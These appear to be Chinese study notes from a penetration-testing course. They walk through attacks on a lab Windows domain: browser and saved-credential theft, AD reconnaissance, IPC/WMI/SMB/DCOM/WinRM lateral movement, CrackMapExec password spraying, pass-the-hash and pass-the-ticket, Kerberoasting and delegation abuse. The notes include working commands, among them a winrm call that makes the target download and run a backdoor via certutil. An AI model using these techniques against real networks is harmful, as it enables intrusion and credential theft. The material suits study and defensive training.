  setspn,         spn技术 获取域内成员主机和基本服务。SPN 可以解决防火墙阻止的，SPN通讯时防火墙是放行的（白名单）。还可以通过-setspn技术来获取。

![1732776076841](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942118.png)

  不建议用工具自带的扫描工具，因为需要上传流量太大。建议还是socks代理然后本地fscan扫描。tasklist /svc >> 1.txt   显示本地或远程计算机上当前正在运行的进程并列表列出每个进程所提供的服务。在1.txt上：

![1732777087751](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942119.png)

AVCheck  ，项目对杀软进行识别并快速发现杀软：

python AVCheck.py 1.txt        <有报错，文件编码问题>            后面还可以用在线杀软识别。

  HackBrowserBata工具。获取浏览器数据-----主要针对个人用机。密码收集：								https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA

SharpDecryptPwd：获取NavicatCrypto上的数据账户密码

![1732778527329](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942120.png)

# 177：内网工具

## 信息收集

#### 1、本机

对本机（内网中个人用机）进行信息收集： 

​     HackBrowserData 快速获取浏览器的账户密码  这种工具一般用于让浏览器自动保存密码的。----https://github.com/moonD4rk/HackBrowserData   这里需要用管理员打开exe运行，运行后在results文件中有浏览器的数据：

![1732799756640](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942121.png)

打开扫到的信息：

![1732799820746](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942122.png)

 场景：还有用户将一些账户密码喜欢保存在自己的文档中：searchall ----------https://github.com/Naturehi666/searchall		这里最好还是用管理员权限运行，否则收集的信息不太全

指定路径搜索相关可疑信息

![1732800045168](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942123.png)

指定的浏览器或者all

![1732800181281](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942124.png)

场景： 用户用一些工具来保存自己的账户密码，工具自动存储。：Pillager - -----https://github.com/qwqdanchun/Pillager 			生成的文件会保存在当前目录的 temp下  --- xxx.zip    （存为zip有免杀的原因）   这款较为强大。会自动收集许多软件的，敏感信息：

![1732800585010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942125.png)

打开有许多软件的数据：

![1732800774482](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942126.png)

![1732800798302](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942127.png)

社工，vx方面窃取数据：https://github.com/guchangan1/All-Defense-Tool#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7

#### 2、

对外打点：

  fscan  （内网或者域环境）可以在攻击机（隧道或者socks）也可以在目标机器  -- - 可以不复现，和前面一样。

 Template  也是可以本机（隧道或者socks）或目标机器 优势：可以扫到一些域的信息，更倾向于域环境，而且特征比fscan少 https://github.com/1n7erface/Template

![1732801533927](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942128.png)

#### 3、

专门针对域内分析：

   Adfind 在域环境下非常强大的信息搜集工具。https://www.joeware.net/freetools/tools/adfind/								可以在本地（攻击机）也能在被控机。本地需要配置host，最好还是被控机。这里因为Dns解析不同，所以让本地和攻击机绑定同一个host，域名解析相同ip。

![1732801697768](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942129.png)

可以获取域用户成员等信息，许多信息：

![1732802387854](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942130.png)

 图形化：bloodhound   https://github.com/BloodHoundAD/BloodHound       需要安装配置数据库neo4j 。用户 neo4j  密码123456      这里是在火绒的虚拟机上运行成功的，本地java有问题

![1732805812823](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942131.png)

这个工具需要上传一个二进制文件或者powershell文件。上传运行到工具页面就可以获取域内信息

![1732806518501](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942132.png)

二进制采集工具命令，https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors	

![1732806926192](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942133.png)

运行获取二进制文件----这里是在DC机上运行，域用户那两个机子太老了，没有vmtool上传不了这工具上去执行命令：

![1732806136782](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942134.png)

上传二进制文件：

![1732807237142](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942135.png)

刷新一下后重启一下，成功获取域内信息：

![1732807414632](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942136.png)

其他一下工具：https://github.com/guchangan1/All-Defense-Tool#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7

# 178:域内域外

![1732855937089](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942137.png)

​      拿到权限先看是什么用户，如果为普通用户，那么就先提权到system权限（逃离DC控制，能于域内用户通讯），或者切换成域内用户，先获取密码凭证---->然后切换用户输入密码

![1732893793057](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942138.png)

![1732893767715](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942139.png)

提权插件：

![1732893944807](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942140.png)

可以执行域内命令：

![1732894006981](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942141.png)

这里因为ailiyun老报警，所以重新配置环境后用kali当作攻击机服务端------------目前环境说明：环境也配不动，不管了，现在就是本机YJB能ping 通web 机，web 出不来，就用YJB当跳板机连接web



  用工具枚举爆破用户密码--在域外爆破域内用户的账户密码

![1732945720079](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942142.png)

 minkatz  在win10及win-server2012R2以上抓取不到明文，只能抓取hash值。因为这些版本以上默认内存中关闭了注册表缓存明文密码

![1732945990353](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942143.png)

 域内域外用户都需要提权			

33        ipc （文件共享） 测试攻击   利用ipc文件共享与目标主机建立连接      dc:3.21             sql:3.32 	ipc工具：用前面收集到的密码凭证去套用        建立ipc连接          user\admin 一般为域内用户，admin或者\admin一般为域外本地用户：			

![1732946217851](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942144.png)

#### IPC$利用命令

net use \\server\ipc$ "password" /user:计算机名\username # 工作组												                                  net use \\server\ipc$ "password" /user:域名\username #域内

net user \\192.168.3.32\ips$ "123456" /user:god\administrator     登录god域（这里有god域就自动识别）的administrator 用户

net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator   如果当前为域内用户执行命令，这种写法是默认为登录要域里的administrator用户（DC），如果为本地用户执行这命令时，就是登录本地机器（当前控制机器）的administrator用户，因为没有加目标计算机机器的名字。

net use \\192.168.3.32\ipc$ "admin!@#45" /user:sqlserver\administrator   如果当前为域内用户执行命令的话：就是先找有没有sqlserver域，没有的话就当作sqlserver计算机名，用户为administrator，如果有域是 sqlserver，那么就找sqlserver域下的administrator用户。如果为本地用户执行这命令时，就直接找的是sqlserve计算机的administrator用户。

总结下来就是要登录域内用户时候要加上域+用户（god\administrator）    登录本地时：本地机器名+用户（sqlserver\administrator ）

![1732961884029](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942145.png)

这里是用web机的域外（administartor用户）可以通过ipc连接到sqlserver的administrator:

![1732979651063](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942146.png)

![1732979752669](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942147.png)

控制Webserber--(后面简称web机)，能ping 通内网sqlserver机，使用正向后门，先上传到web机上---在上传copy到目标

​    sql主机----再用at 或者schtasks（两个有使用场景）计划任务执行。运行后正向后门需要web机主动connect，at使用时目标小于win2012  schtasks是目标大于Win2012

![1734321268190](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942148.png)

 反向后门，监听器为web 的内网地址3.31

后面继续得到其他域内主机的密码，最后喷射出dc密码进行登录连接

  cs插件：

![1732946359542](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942149.png)

  工具箱  借助socks代理用py文件进行ipc建立连接

先连接sql，然后设置好代理，再用工具：

![1732947502501](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942150.png)

![1732947488408](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942151.png)

这里连接后执行whoami成功，还可以实现上线：让sql机远程下载后门（不建议）2、powershell命令实现上线

![1732948094690](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942152.png)

1h34       关闭ipc，

 ipc策略问题    ---- 后续补充改错

补充：域外用户切换到域内用户没成功：

# 179: 让域内上线方法

环境说明：本机YJB能ping 通god/web 机，god/web里的都出不来。然后下面先通过YJB作为跳板上线

![1732977961289](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942153.png)

   遗留问题：切换用户上线 。上面web机不能切换用户上线是与系统版本有关，windows2008不支持

这里是sql的域外用户：

![1732978327097](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942154.png)

执行切换用户：

![1732978732634](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942155.png)

### wmi  

方便管理员对windows主机进行管理，开启了此服务。所以可以用WMI进行横向移动，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。利用条件：

1、WMI服务开启，端口135，默认开启。

2、防火墙允许135、445等端口通信。

3、知道目标机的账户密码或HASH。一般都是先收集到目标主机浏览器密码，其他服务密码去套

使用内置wmic 缺点：无回显。需要有明文（不支持hash）优点就是wmic命令是内部命令（白名单）



​    用被控机ping 内网目标机---能通就建立正向后面在connect ---ping 不通就 反向后门（转发上线），这里关键的点还有web刚好有一个web服务，可以实现向目标sql机执行后门上传文件命令。(这里的web服务是前面信息大点收集的，查看端口开放，查看web机器有没有网络服务net start  ，有IIS Admin service 的服务，可以将上传的后门放到web目录下，然后就可以实现向sql机后续操作)

![1732980057421](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942156.png)

![1732980083249](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942157.png)

找到iis服务的默认web存储路径

![1733041150663](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942158.png)

上传zx后门到IIS的web服务路径下，后期和sql目标机建立连接后用来上传：

![1733041338449](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942159.png)

  套件工具  可以用hash加密，也支持交互式的密码连接。较推荐-----一般py文件可以打包成exe然后上传到目标机上运行，不过一般不选择这种方式，太明显（流量+免杀）。一般选择在本地机器上执行，这里是建立web机的administrator用户流量隧道/socks通道。

![1732980227409](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942160.png)

用socks代理在web机上建立节点。用工具执行命令与sql建立连接，成功与目标机通讯，然后可以上传后门先到被控机web上，在执行上传后门的命令实现上线。（这里思路清晰点：是通过web机建立的通讯，自然也是通过web机上传的后门到sql机上）

这里先是拿到sql的Shell：

![1732980610905](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942161.png)

通过拿到的shell上传文件-----真实下是因为YJB只能和web机通讯，web机作为内网机能与sql机通讯，所以需要通过web机来上传exe到sql机：

![1733041773785](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942162.png)

执行3232.exe 用web 机connect             sql机：

![1733041956661](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942163.png)

  c2插件  需要上传vbs。所以不建议

![1733042053179](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942164.png)

### SMB:

开启了打印和文件共享作用的服务

   CS不支持交互式。所以psexec工具（PsExec.exe为白名单程序）不建议-------------一般用图形化工具可以：

![1733042538285](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942165.png)

  还是用套件----工具  smbexec.py  和上面一样，配好节点后建立连接：

![1733042836602](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942166.png)

#### hash加密也可以横向

这里hash加密也可以，要对应好：

![1733044504518](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942167.png)

  cs插件  ---    cs-psexec， 对sqlsever进行上线操作

![1733044623385](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942169.png)

这里用户密码自己选择，监听器一般选择正向，如果能通的话，工具会自动连接。这里域一般选择能与目标通信，且在一个域内，会话选择能通信的。这里主要还是要确保用户，密码，域三个都得对应正确。

![1733045756767](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942170.png)

sqlserver成功上线

![1733045902645](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942171.png)

### DCOM

0.适用目标Win7系统以上-----因为这个是建立在powershell命令基础上

1.管理员权限PowerShell

2.远程主机防火墙未阻止

​     dcomexec-impacket   dcomexec.py   一样的，工具箱中的py文件执行命令----支持hash和明文		python dcomexec.py sqlserver/administrator:admin!@#45@192.168.3.32

​      wmi防火墙的，windows manage ni...那个入站还是出站的策略（xd没看见）试一下开一下防火墙能否通过wmi，wmi也不会在日志中被记录  

#### 防火墙

SMB ：

![1733048252797](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942172.png)

DDOM：

![1733048364506](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942173.png)

wmi也有，不过没找到。

# 180：

### WinRM      

### WinRS   

一种横向移动的协议

利用条件：

1、win 2012之前利用需要手动开启winRM ，在win 2012之后(包括win 2012)的版本是默认开启的， 

2、防火墙对5986、5985端口开放。

​    先扫端口是否开放   5986、5985 （这里最好还是先提到system，在扫5985端口情况）

![1733135556613](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942174.png)

小插曲：

需要先开启WinRM服务：

![1733136365631](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942175.png)

winrs执行远程命令：

![1733136408276](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942176.png)

 解决cs上执行WinRM报错（cs不支持交互式），换一种执行方式。

![1733136693156](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942177.png)

用cs自带的插件运行也报错：

![1733136825756](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942178.png)

换了一种方式执行：

![1733136917715](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942179.png)

防火墙：

![1733141575985](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942180.png)

  反向

![1733142490112](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942181.png)

35 演示反向--------web站点（web机没有开web服务）  sql机打开防火墙：（入站拦截，出站不拦截）：

转发上线-----监听----用刚才的shell winrm invoke Create wmicimv2/win32_process @{CommandLine="cmd.exe /c certutil -urlcache -split -f http//192.168.3.31/4444.exe 4444.exe & 4444.exe"} -r:sqlserver -u:sqlserver\administrator -p:admin!@#45       执行上线

### RDP 

远程终端连接服务

对方开启RDP服务 3389 端口          远程桌面

​            还是socks代理，设置好后可以用mstac连接

![1733145385480](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942182.png)

连  隧道（http），这里是用冰鞋上传的后门建立的http隧道，实现内网穿透，将目标的3389远程终端连接端口映射到本地，不过这里需要的流量太大，冰鞋支持不了。其他的方法：frp,nps，iox等方法都需要上传到目标机，所以还是选用http隧道。

![1733145945752](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942183.png)

正常连接时：

![1733146097700](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942184.png)

用冰鞋连接尝试http代理，看能否实现映射，端口为3389，RDP服务的：（刚才的shell.asp不支持，这里的.aspx支持）

![1733146130190](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942185.png)

这时再来连接：

就可以了，不过冰鞋的流量不支持，这流量太大了，所以不稳定

1h      hash连接，需要在被控机上操作，用mimikatz将hash值导入到目标机，这种方式对系统也有要求。有些鸡肋

sharpRDP:        一款工具，不用自己手动的连接远程桌面，不过不建

### CrackMapExec-密码喷射

解决了域内用户多，密码多，账户多等问题。不错的工具。

  这款工具有windows 也有 linux  ，都需要安装配置，这里选用的是kali自带的。不过前提需要先配置好代理---socks                    

kali下改socks代理的配置文件：       环境说明：kali是通信不到3网段的web和sql机的。

![1733147257820](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942186.png)

这里说明：域内用户，域内本地用户。比如:：web 机dbadmin用户就是域内用户，域内本地用户就是web 机的administrator

先拿到域内用户，然后net user /domain        ，存到1.txt中。然后抓取密码得到hash值或者明文

![1733147957938](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942187.png)

开始喷射：

![1733148177350](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942188.png)

 有＋号就是喷射成功：

![1733148493587](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942189.png)



​    

proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45'           这是登录域内adminstrator 用户域，就是DC，密码应为：Admin12345      这里就没有+号

![1733148523010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942190.png)

proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45' --local-auth 这是登录域内本地用户的administrator  

![1733148709400](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942191.png)

![1733148697349](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942192.png)

还可以执行上线命令（全部测试的）：

![1733148884794](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942193.png)

成功的都上线了：

![1733148903706](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942194.png)

还可以创建密码字典，hash字典等操作手法很多  https://www.cnblogs.com/Yang34/p/14411497.html

# 181: 

背景：windows 2012以上默认关闭了Wdigest，所以攻击者无法通过内存获取到明文密码，所以就有下面的几种方法(前面的wmi和smb服务也可以)：

pass the hash（哈希传递攻击，简称pth）

pass the ticket（票据传递攻击，简称ptt）重点

pass the key（密钥传递攻击，简称ptk）

![1733304344193](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942195.png)

### pth:   hash传递

可以看出来基本现在都是ntml的hash，， 

![1733151600149](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942196.png)

 LM和NTML两个hash值的种类。前面的Wmi  smb 都是hash的pth攻击。

###### NTML

抓取明文密码时候，以NTML的hash为准：

![1733304997753](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942197.png)

![1733305018372](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942198.png)

 hash解密          cmd5在线，工具：https://hashcat.net/hashcat/   不过原理都是hash碰撞。

![1733305436114](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942199.png)

这里工具还有许多玩法，-m 密文类型           -a 破解类型         ?l 小写?s 符号?d 数字      	大写字母就是?u		eg: admin!@#45  5个字母（?l）3个符号（?s）2个数字（?d）  ?l?l?l?l?l?s?s?s?d?d   工具比较看cpu显卡的速度

参数1000就是指用NTML的hash来进行碰撞：

![1733305572632](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942200.png)

mimikatz向计算机中写内存：

hashcat -a 0 -m 1000  518b98ad4178a53695dc997aa02d455c  --show

利用hash值进行移动可以用上面的wmi   smb  dcom 几个协议进行上线

### ptt:票据攻击         

 Kerberos票据中心。

 思想：用漏洞让Kerberos给自己发一张票，用mimikate进入，（导入内存中 ，好像做了个假的身份证），在连接上。这里需要明文（不支持hash）。先获取目标的SID值，然后用ms14漏洞生成门票，然后用mimikate导入门票到目标中，然后连接上线

![1733306579595](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942201.png)

这里的攻击条件是域内用户，然后域内密码是刚才破解出来的。先将漏洞工具上传：

![1733307451179](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942202.png)

ping 一下域控（DC是前面收集到的ip）

![1733318539839](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942203.png)

生成票据文件：

![1733307660101](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942204.png)

此时查看没有票据：

![1733307707298](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942205.png)

生成票据文件

![1733318582880](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942206.png)

先尝试连接DC ,不行。然后显示当前票据：

![1733318619644](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942207.png)



用mimikate导入票据：mimikatz kerberos::ptc TGT_webadmin@god.org.ccache

![1733318733005](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942208.png)

连接目标上线，这里就连接到了DC机器：

![1733318787834](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942209.png)

下来就上传正向后门到目标机器在执行上线----思路是上传后建立一个服务（类似于定时服务一样），然后执行服务，用web机连接connect ，得到DC权限：

先查看当前目录下的后门文件 4444.exe，在copy到DC机器：

![1733319097667](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942210.png)

copy：

![1733319159007](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942211.png)



####  kekeo:

也是一款工具，使用hash值来换成票据。直接调用cmd。利用获取的NTLM生成新的票据尝试认证（pth（hash）的攻击转为ptt(票据)攻击）

![1733319708457](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942212.png)



####   历史漏洞

 历史遗留的票据重新认证尝试。DC登录过目标机器，或者连接过（比如说更改当前机器防火墙就需要登录域管权限）。就会有票据遗留，所以就可以抓出来这个票据（时间就几个小时内登录过）

这里执行命令需要system权限，我这里环境没有配置好，导致提权不了，提权到system需要MS14-058漏洞，这款漏洞支持反向后门，但我这儿环境反向不了。所以没有演示：

![1733320448934](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942213.png)

执行mimikate导出命令后，发现多了administrator的几个票据，然后导入，连接，上线。

![1733320317007](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942214.png)

  成功与否看加密类型------RC4类型（暴力破解）

 手工监测：SPN技术获取域内通讯服务，在去连接通讯服务，连接后查看票据加密类型能否支持爆破。



![1733321268609](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942215.png)

mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433

![1733321289154](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942216.png)

这里的web机和DC不信任了。所以报错：

下来只需要查看klist看是什么加密类型：--会话密钥类型是不是rc4,

工具检测（需要考虑免杀和通讯问题） ：

Rubeus kerberoast     检测有没有rc4加密，这里是aes加密。如果为rc4加密的话会破解出来他的hash值

![1733321644240](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942217.png)

jack机登场：破解出来为文件票据：用 tgsrepcrack.py解密手工生成的票据      为HASH密文：hashcat 。

Rubeus   							破解主机后获取为hash值。  这里的目标为0day/jack

![1733326096273](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942218.png)

Rubeus kerberoast

![1733386730489](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942219.png)

impacket-getuserspns        这个破解后为hash值。用py文件建立代理测试，后连接破解生成hash.txt，内容和上面工具的hash一样.。用socks代理在提醒一下，代理服务器为c2服务器，端口为socks端口，差点将ip写成jack机的。：

![1733387427775](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942220.png)

用py工具连接并且将能破解的票据格式保存到hash.txt：

![1733387565057](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942221.png)

手工查看：

![1733387680076](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942222.png)

###### 票据破解：

先看spn服务，在找到能通讯的服务--msssql，在用mimikate产生票据，最后导出并破解：

![1733387985231](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942223.png)

用mimikate将票据拿出来然后破解，手工连接（mimikate）后会产生票据，这时候用Mimi导出来然后用py工具破解。

将获取到的票据导出来：

![1733388225497](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942224.png)

下载到本地：

![1733388313896](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942225.png)

![1733388410795](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942226.png)

用kerberoast.py 破解票据：

![1733388684919](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942227.png)

###### hash破解：

将刚才Rubeus 得到的hash或者impacket-getuserspns得到的hash.txt用hashcat进行破解：

先看票据的加密类型为rc4类型，因为后面需要hashcat -m后的参数类型需要和当前加密一致：

![1733389146622](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942228.png)

![1733389322460](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942229.png)



有明文传递，肯定用明文->没有明文就用，PTH(HASH传递)->PTT(票据攻击)3个方法->PTK(AES)

### ptk    AEC  加密

条件严格：系统安装了KB2871997补丁（打了补丁也不一定好。哈哈）且禁用了NTLM（禁用.......）的时候，和ptt你死我活的样子。

鸡肋：得有图形化UI页面，这里不适用。最后弹出来的在目标机桌面终端操作

# 182:委派

  DC设置环境  	机器/主机委派     设置webserver为非约束委派后，下来就只需要获取票据就可以直接和域控通讯，不需要别的认证。（非约束委派好像一个代理人，秘书一样，说的话就和自己说的话分量一样重）

![1733470670239](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942230.png)

还可以用命令设置用户有委派权限（这里的Webadmin用户一开始属性是没有委派这个选项的）：

![1733471273215](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942231.png)

没有复现，环境问题：

攻击条件：

1、需要Administrator权限

2、域内主机的机器账户开启非约束委派

3、域控管理员远程访问（主动或被动）

 测试。通过工具测试是否存在委派机器 。

将工具adfind.exe上传，有委派用户：

![1733476484278](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942232.png)

没委派用户：

![1733476514419](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942233.png)

有委派机器webserver ，DC（本身就有）：

![1733476560577](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942234.png)



DC方法：查到委派机器后钓鱼让DC访问委派机器，拿到票据（类似上节的历史漏洞）

#### 非约束委派：

 翻车---------      一种是让DC主动访问过委派机，或者就是制作一个钓鱼网页在委派机上等待DC连接这两种其实比较鸡肋。

![1733476653795](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942235.png)

得到票据：

![1733476668172](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942236.png)

导入内存并且连接DC:

![1733476711436](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942237.png)

下来是另一种方法：结合打印机漏洞（对DC操作系统有要求：win2012以上），让DC强制访问 自己

DC是win2012以下版本演示： 

让DC连接Webserver（当前被控机）

![1733476832224](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942238.png)

报错：

![1733476873820](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942239.png)

DC为win2012上（xiaodi8）：       web机的administrator先建立一个监听器，然后让DC强制连接web机,然后得到hash.txt。这里需要用生成监听的工具来导入，因为生成监听器时用的工具，所以这里的hash格式和mimikate的不符合。这里的导出的票据为DC的，解密还是用mimikate，这里可以获取到域内所有的hash

![1733558618295](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942240.png)

演示：  这里环境问题，正反向都不出网，就在本机上操作了，演示说明即可：DC：windows2016---								被控机	windows10 ----- xdpc  ,将被控机用户和机器都是非约束委派

![1733478554095](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942241.png)

Rubeus监听来自DC的请求数据并产生hash.txt保存hash：

![1733480322588](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942242.png)

域用户运行SpoolSample强制让DC请求：

![1733480367867](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942243.png)

Rubeus监听到请求并产生hash.txt:

![1733480401638](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942244.png)

Rubeus监听到票据并导入该票据(底下的hash):，上面解释了为什么这里用Rubeus导入不用mimikate：

导入成功  --------这里主要导入的hash值需要先放到一行后在导

![1733481072639](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942245.png)

这里的票据是DC的票据，用mimikate获取到所有的hash，

![1733559526609](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942246.png)

下来在继续  使用wmi借助hash横向移动

![1733559610884](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942247.png)



  打印机服务

![1733559669699](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942248.png)

win2012以下攻击：

#### 约束委派：

1h05  判断约束委派	

![1733560100843](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942249.png)    条件：

![1733559954414](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942250.png)   																																			

 获取webadmin票据（将票据理解成一种免死金牌）。用s4u方法利用刚才获取的webadmin票据请求DC，进而得到DC的票据。将DC的票据用mimikate导入票据到内存中，然后成功通讯DC(shell dir \\owa2010cn-god.god.org\c$)

